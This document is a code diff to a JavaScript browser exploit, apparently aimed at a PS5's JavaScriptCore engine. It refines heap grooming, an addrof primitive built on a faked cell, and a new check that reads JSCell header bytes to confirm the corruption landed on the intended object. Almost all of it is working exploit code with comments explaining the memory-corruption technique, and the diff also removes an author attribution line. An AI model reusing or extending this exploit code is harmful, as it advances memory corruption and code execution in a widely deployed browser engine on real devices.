@@ -1,4 +1,3 @@
-/* Copyright (c) 2026 mansoor0x | 1_X @ZeroMan. Attribution notice; upstream license remains applicable. */
 let DRAIN_COUNT = 512;
 const AUTO_RETRY_DELAY_MS = 50;
 
@@ -17,10 +16,10 @@ const HOLDER_BYTES = 0x40;
 const HX1400_LIGHT_CORE =
   new URLSearchParams(location.search).get("hx1400") === "1";
 
-// Heap profile, chosen with ?mem. The default is the heaviest groom of all
-// -- 12 million slots, drain 512, around 130 MB -- and that is where
-// placement-throw and zero-header-miss cluster. Selecting a lighter profile
-// is therefore worth trying when a console keeps missing.
+// Heap profile, chosen with ?mem. Without one the groom uses drain 512 and
+// a carrier that starts small and grows only as far as coverage demands --
+// see CARRIER_CAP below. A fixed profile caps the carrier harder and drains
+// less, which is worth trying when a console keeps missing.
 const HX_MEM_LEVEL = (function () {
   try {
     const q = new URLSearchParams(location.search).get("mem");
@@ -131,22 +130,29 @@ const CARRIER_MAX = 9000000; // 72 MB
 function growCarrier(minSlots) {
   const cap = Math.min(CARRIER_CAP, CARRIER_MAX);
   if (CARRIER_SLOTS >= cap) return false;
-  // Grow EXACTLY, with no margin: `minSlots` is the measured need
-  // (ceil(need/8)), and every byte beyond it is heap pressure for nothing.
+  // Grow EXACTLY, with no margin: every byte beyond the measured need is
+  // heap pressure for nothing, and heap pressure is what makes the GC move
+  // things at the wrong moment.
+  //
+  // Doubling was tried instead, on the reasoning that it reaches the larger
+  // draw one attempt sooner. That reasoning rested on reading `chars` as a
+  // size, which it is not -- see the head-word oracle below. With the oracle
+  // in place this branch is only reached on a build the oracle does not
+  // recognise, and that is the last place to be spending twice the heap.
   if (minSlots > cap) return false;
-  CARRIER_SLOTS = Math.min(cap, Math.max(minSlots, CARRIER_SLOTS * 4));
+  CARRIER_SLOTS = Math.min(cap, Math.max(minSlots * 2, CARRIER_SLOTS * 4));
   CARRIER_BYTES = CARRIER_SLOTS * 8;
   return true;
 }
 
 // fakeHost becomes a dictionary (three `delete`s), and a dictionary lets the
-// GC rearrange things. Between building it and the critical load there used
-// to sit 65,532 objects, a serialization of this graph, a 96 MB carrier
-// butterfly with its twelve-million write loop and two timer steps. If q2/q3
-// get pushed out of the inline slots along the way, the faked cell's vector
-// and length are 0, every index lies out of bounds, `candidate[i]` is
-// `undefined` -- and that reads back as 0x30 zero bytes: `zero-header-miss`.
-// So fakeHost is built late, right before it is needed.
+// GC rearrange things. Between building it and the critical load sit 65,532
+// objects, a serialization of this graph, the carrier butterfly with its
+// write loop and two timer steps. If q2/q3 get pushed out of the inline
+// slots along the way, the faked cell's vector and length are 0, every index
+// lies out of bounds, `candidate[i]` is `undefined` -- and that reads back as
+// 0x30 zero bytes: `zero-header-miss`. So fakeHost is built late, right
+// before it is needed, and the carrier is allocated ahead of it.
 
 const symbolToString = Symbol.prototype.toString;
 
@@ -868,7 +874,6 @@ function prepareAddrof() {
   getterCarrier[1] = targetHolder;
   getterCarrier[2] = fakeHost;
   getterCarrier[3] = targetHolder;
-  emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
 
   preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
   emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
@@ -884,7 +889,6 @@ function runAddrofCapture() {
     for (let i = 0; i < 16; i++)
       capturedWords[i] = capturedString.charCodeAt(7 + i);
 
-    /* RELEASE_CAPTURED_STRING_EARLY */
     capturedString = null;
 
     captureState = 1;
@@ -1154,9 +1158,6 @@ function loadHistoryCritical() {
     profile.nativeExecType = targetHeader[5];
     profile.nativeExecFlags = targetHeader[6];
 
-    try {
-      globalThis.__ps5NativeCtor = nativeConstructorAddress;
-    } catch (e) {}
     const nativeExecType1 = targetHeader[5];
 
     nativeExecutableHeaderOK =
@@ -1283,7 +1284,6 @@ function runGroomAndLoad() {
     ]);
     loadHistoryCritical();
 
-    /* RELEASE_HISTORY_GRAPH_EARLY */
     outerGraph = null;
     fillerGraph = null;
 
@@ -1361,10 +1361,39 @@ function beginComposition() {
   const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
   const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
-  /* ADDROF_COVERAGE_PATCH */
   const requiredSourceBytes = fakeChars * 2;
   const minimumSlots =
     Math.ceil(requiredSourceBytes / 8);
+
+  // This value is not a length. Take off the eight characters that
+  // descriptiveString() wraps around it as "Symbol(" and ")", and what is
+  // left is the second header word of the carrier function itself:
+  //
+  //     08  IndexingType = NonArrayWithContiguous
+  //     1a  m_type       = JSFunctionType
+  //     0e  m_flags
+  //     xx  m_cellState  = GC colour, 0 black / 1 white / 2 grey
+  //
+  // Hence exactly three observed values (0x0e1a08 + colour * 2^24) and the
+  // step of 2^24. Confirmed on the device: JSC-PROFILE reports
+  // fn=0x1a-fnflags=0xe, the same two bytes.
+  //
+  // Read as a size, the value demands 1.85 / 35.4 / 69 MB of carrier
+  // depending on that colour -- but no carrier size can influence a GC
+  // colour, and the check runs 50 ms AFTER the copy anyway. So it is used
+  // here as an oracle instead: did we hit the head of the right cell?
+  const HEAD_EXPECTED = 0x0e1a08;
+  const headOK =
+    (fakeChars & 0x00ffffff) === HEAD_EXPECTED && fakeChars >>> 24 <= 2;
+
+  emit(
+    "ADDROF-HEAD",
+    `word=0x${fakeChars.toString(16)}` +
+    `-type=0x${((fakeChars >>> 8) & 0xff).toString(16)}` +
+    `-flags=0x${((fakeChars >>> 16) & 0xff).toString(16)}` +
+    `-gc-colour=${fakeChars >>> 24}` +
+    `-headOK=${headOK}`
+  );
 
   emit(
     "ADDROF-COVERAGE",
@@ -1382,9 +1411,12 @@ function beginComposition() {
       `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`,
   );
 
-  if (!(repeated && distinct && plausible && sourceCovered)) {
-    if (!sourceCovered && growCarrier(minimumSlots))
-      emit("TRAEGER-WACHSEN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
+  /* headOK OR the old coverage test: the oracle is the sharp probe, and
+     coverage stays as a fallback in case another build carries different
+     type numbers. This path is therefore never stricter than before. */
+  if (!(repeated && distinct && plausible && (headOK || sourceCovered))) {
+    if (!headOK && !sourceCovered && growCarrier(minimumSlots))
+      emit("CARRIER-GROWN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
     finishEarlySafeAttempt(
       "ADDROF-FAIL",
       `repeat=${repeated}-distinct=${distinct}` +
@@ -1394,7 +1426,6 @@ function beginComposition() {
     return;
   }
 
-  /* RELEASE_ADDROF_OBJECTS_EARLY */
   capturedString = null;
   capturedWords = null;
   preparedSymbolObject = null;
